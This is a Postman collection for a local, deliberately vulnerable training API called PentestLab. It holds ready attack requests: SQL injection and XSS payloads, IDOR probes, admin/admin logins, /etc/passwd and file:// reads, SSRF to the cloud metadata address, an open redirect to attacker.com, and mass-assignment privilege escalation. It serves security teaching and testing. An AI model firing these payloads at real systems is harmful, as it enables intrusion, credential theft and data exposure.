{
  "info": {
    "name": "PentestLab Enterprise - Complete Testing Collection",
    "version": "2.0",
    "description": "Industry-grade API security testing collection covering 52 vulnerabilities with detailed testing cases for SQL Injection, XSS, IDOR, Authentication, SSRF, XXE, and more. Includes Postman scripts, test cases, and security assessment toolkit.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
    "documenter": "PentestLab Team"
  },
  "auth": {
    "type": "bearer",
    "bearer": [
      {
        "key": "token",
        "value": "{{jwt_token}}",
        "type": "string"
      }
    ]
  },
  "item": [
    {
      "name": "ðŸ”´ CRITICAL: SQL Injection",
      "item": [
        {
          "name": "Boolean-Based SQL Injection",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/injection/sqli/boolean?username=' OR '1'='1",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "injection", "sqli", "boolean"],
              "query": [
                {
                  "key": "username",
                  "value": "' OR '1'='1",
                  "type": "string"
                }
              ]
            },
            "description": "Test boolean-based blind SQL injection. Returns all users if vulnerable."
          },
          "response": [],
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "var response = pm.response.json();",
                  "pm.test('SQL Injection Detected', function() {",
                  "    pm.expect(response.ok).to.equal(true);",
                  "    pm.expect(response.results.length).to.be.greaterThan(0);",
                  "});",
                  "pm.test('Vulnerable Query Exposed', function() {",
                  "    pm.expect(response.query).to.include('OR');",
                  "});"
                ]
              }
            }
          ]
        },
        {
          "name": "Time-Based Blind SQL Injection",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/injection/sqli/time-based?id=1' AND SLEEP(5)--",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "injection", "sqli", "time-based"],
              "query": [
                {
                  "key": "id",
                  "value": "1' AND SLEEP(5)--",
                  "type": "string"
                }
              ]
            },
            "description": "Time-based blind SQL injection - 5 second delay indicates vulnerability"
          }
        },
        {
          "name": "UNION-Based SQL Injection",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/injection/sqli/union?search=' UNION SELECT username, password FROM user--",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "injection", "sqli", "union"],
              "query": [
                {
                  "key": "search",
                  "value": "' UNION SELECT username, password FROM user--",
                  "type": "string"
                }
              ]
            },
            "description": "UNION-based SQL injection - reveals database schema"
          }
        }
      ]
    },
    {
      "name": "ðŸ”´ CRITICAL: XSS Vulnerabilities",
      "item": [
        {
          "name": "Reflected XSS - Basic",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/xss/reflected?message=<img src=x onerror=\"alert('XSS')\" />",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "xss", "reflected"],
              "query": [
                {
                  "key": "message",
                  "value": "<img src=x onerror=\"alert('XSS')\" />",
                  "type": "string"
                }
              ]
            },
            "description": "Basic reflected XSS via message parameter"
          }
        },
        {
          "name": "Reflected XSS - Script Tag",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/xss/reflected?message=<script>alert('Vulnerable')</script>",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "xss", "reflected"],
              "query": [
                {
                  "key": "message",
                  "value": "<script>alert('Vulnerable')</script>",
                  "type": "string"
                }
              ]
            }
          }
        },
        {
          "name": "Stored XSS - Create Comment",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"comment\": \"<img src=x onerror='alert(\\\"Stored XSS\\\")'>\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/xss/stored",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "xss", "stored"]
            },
            "description": "Store XSS payload in database"
          }
        },
        {
          "name": "Stored XSS - Retrieve",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/xss/stored",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "xss", "stored"]
            },
            "description": "Retrieve stored XSS payload - executes on page load"
          }
        }
      ]
    },
    {
      "name": "ðŸ”´ CRITICAL: Access Control (IDOR)",
      "item": [
        {
          "name": "IDOR - Access User ID 1",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/access/idor/1",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "access", "idor", "1"]
            },
            "description": "Retrieve admin user data without authorization"
          }
        },
        {
          "name": "IDOR - Access User ID 2 (Lateral)",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/access/idor/2",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "access", "idor", "2"]
            },
            "description": "Access another user's sensitive data (SSN, salary)"
          }
        },
        {
          "name": "IDOR - Access User ID 3",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/access/idor/3",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "access", "idor", "3"]
            }
          }
        }
      ]
    },
    {
      "name": "ðŸŸ  HIGH: Authentication Flaws",
      "item": [
        {
          "name": "Default Credentials (admin/admin)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/auth/login",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "auth", "login"]
            },
            "description": "Default admin credentials still active"
          }
        },
        {
          "name": "Weak Password Accepted",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"testuser\",\n  \"password\": \"1\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/auth/weak-password",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "auth", "weak-password"]
            },
            "description": "Password policy accepts 1-character passwords"
          }
        },
        {
          "name": "Brute Force Attack (No Rate Limiting)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"attempt123\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/auth/brute-force",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "auth", "brute-force"]
            },
            "description": "No rate limiting - can brute force unlimited attempts"
          }
        }
      ]
    },
    {
      "name": "ðŸŸ  HIGH: Information Disclosure",
      "item": [
        {
          "name": "Exposed Configuration",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/config/exposed",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "config", "exposed"]
            },
            "description": "Returns sensitive configuration including API keys and database credentials"
          },
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "var response = pm.response.json();",
                  "pm.test('Secrets Exposed', function() {",
                  "    pm.expect(response.database.password).to.exist;",
                  "    pm.expect(response.api_keys.stripe).to.exist;",
                  "    pm.collectionVariables.set('exposed_db_pass', response.database.password);",
                  "});"
                ]
              }
            }
          ]
        },
        {
          "name": "Debug Endpoint Accessible",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/admin/debug",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "admin", "debug"]
            },
            "description": "Debug endpoint returns environment variables and configuration"
          }
        },
        {
          "name": "Verbose Error Messages",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/error/verbose?file=/etc/passwd",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "error", "verbose"],
              "query": [
                {
                  "key": "file",
                  "value": "/etc/passwd",
                  "type": "string"
                }
              ]
            },
            "description": "Error messages reveal system paths and configuration"
          }
        }
      ]
    },
    {
      "name": "ðŸŸ  HIGH: SSRF & Redirects",
      "item": [
        {
          "name": "SSRF - Internal Metadata",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"url\": \"http://169.254.169.254/latest/meta-data/\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/ssrf/fetch",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "ssrf", "fetch"]
            },
            "description": "Access AWS metadata endpoint or internal services"
          }
        },
        {
          "name": "SSRF - File Access",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"url\": \"file:///etc/passwd\"\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/ssrf/fetch",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "ssrf", "fetch"]
            },
            "description": "Read local files via file:// protocol"
          }
        },
        {
          "name": "Open Redirect - External Site",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/redirect/open?url=https://attacker.com",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "redirect", "open"],
              "query": [
                {
                  "key": "url",
                  "value": "https://attacker.com",
                  "type": "string"
                }
              ]
            },
            "description": "No validation on redirect URL - phishing vector"
          }
        }
      ]
    },
    {
      "name": "ðŸŸ¡ MEDIUM: Business Logic",
      "item": [
        {
          "name": "Race Condition - Double Process",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"transaction_id\": \"TXN-12345\",\n  \"amount\": 1000\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/business/race-condition",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "business", "race-condition"]
            },
            "description": "Send concurrent requests to process same transaction twice"
          }
        },
        {
          "name": "Negative Amount - Withdraw as Deposit",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"amount\": -1000\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/business/negative-amount",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "business", "negative-amount"]
            },
            "description": "Negative amounts accepted - process -100 to add 100 instead"
          }
        }
      ]
    },
    {
      "name": "ðŸ”µ Privilege Escalation",
      "item": [
        {
          "name": "Mass Assignment - Set Admin",
          "request": {
            "method": "PUT",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"is_admin\": true,\n  \"role\": \"admin\",\n  \"permissions\": [\"DELETE_ALL\", \"MODIFY_CONFIG\"]\n}"
            },
            "url": {
              "raw": "{{base_url}}/api/access/privilege-escalation",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "access", "privilege-escalation"]
            },
            "description": "Set admin privileges via mass assignment vulnerability"
          }
        }
      ]
    },
    {
      "name": "ðŸ“Š Utilities",
      "item": [
        {
          "name": "Health Check",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/health",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "health"]
            },
            "description": "Verify API is running"
          }
        },
        {
          "name": "List Vulnerabilities",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/vulnerabilities/list",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "vulnerabilities", "list"]
            },
            "description": "Get all 52 vulnerabilities included in lab"
          }
        },
        {
          "name": "Get Testing Guide",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/testing-guide?vuln_id=WEB-2021-A01",
              "protocol": "http",
              "host": ["{{base_url}}"],
              "path": ["api", "testing-guide"],
              "query": [
                {
                  "key": "vuln_id",
                  "value": "WEB-2021-A01",
                  "type": "string"
                }
              ]
            },
            "description": "Get detailed testing methodology for vulnerability"
          }
        }
      ]
    }
  ],
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:5000",
      "type": "string"
    },
    {
      "key": "jwt_token",
      "value": "",
      "type": "string"
    }
  ]
}
